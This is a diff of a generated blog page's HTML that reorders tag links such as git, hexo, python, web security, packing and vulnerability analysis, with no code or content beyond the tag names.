@@ -1224,15 +1194,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1252,11 +1222,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1264,11 +1234,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
               </li>
              
               <li class="article-tag-list-item">
